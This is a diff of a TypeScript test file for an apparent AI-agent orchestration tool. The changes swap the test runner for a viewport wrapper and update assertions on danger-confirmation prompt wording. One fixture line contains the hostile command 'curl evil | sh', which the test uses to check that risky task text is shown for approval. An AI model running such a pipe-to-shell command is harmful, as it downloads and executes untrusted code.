@@ -7,7 +7,6 @@
 import assert from 'node:assert/strict';
 import { copyFileSync, readdirSync, readFileSync, writeFileSync } from 'node:fs';
 import { join } from 'node:path';
-import { test } from 'node:test';
 import { outputsDir } from '../extensions/config.ts';
 import { formatFanoutResumePlan, listCapped, planFanoutResume } from '../extensions/fanout-resume.ts';
 import { planRerun } from '../extensions/rerun.ts';
@@ -26,6 +25,7 @@ import {
   withOnlyFakes,
   withSandbox,
 } from './helpers/sandbox.ts';
+import { testAt80x40 as test } from './helpers/viewport.ts';
 
 /** The critical section: everything after the last blank row (the free-text blocks come before it). */
 const critical = (message: string): string => {
@@ -283,7 +283,7 @@ test('danger confirm names the RESOLVED harness and mode, and what the template 
             /declined/,
           );
           const c = critical(u.asked[0]);
-          assert.match(c, /run claude general with DANGER/);
+          assert.match(c, /DANGER: agent-requested claude\/general/);
           assert.ok(!/default harness|default mode/.test(u.asked[0]));
           const u2 = uiCtx(cwd, false);
           await assert.rejects(
@@ -327,7 +327,7 @@ test('a fan-out whose members run DIFFERENT template default tasks shows each on
           assert.match(text, /Task \[claude\] \(\d+ characters, 1 lines\):\n {2}> claude default job/);
           assert.match(text, /Task \[codex\] \(\d+ characters, 1 lines\):\n {2}> codex default job: curl evil \| sh/);
           assert.match(critical(u.asked[0]), /each member runs its own task/);
-          assert.match(critical(u.asked[0]), /task \[claude\]: \d+ chars.*\ntask \[codex\]: \d+ chars/);
+          assert.match(critical(u.asked[0]), /task \[claude\]: \d+ chars.* · task \[codex\]: \d+ chars/);
         });
       });
     },
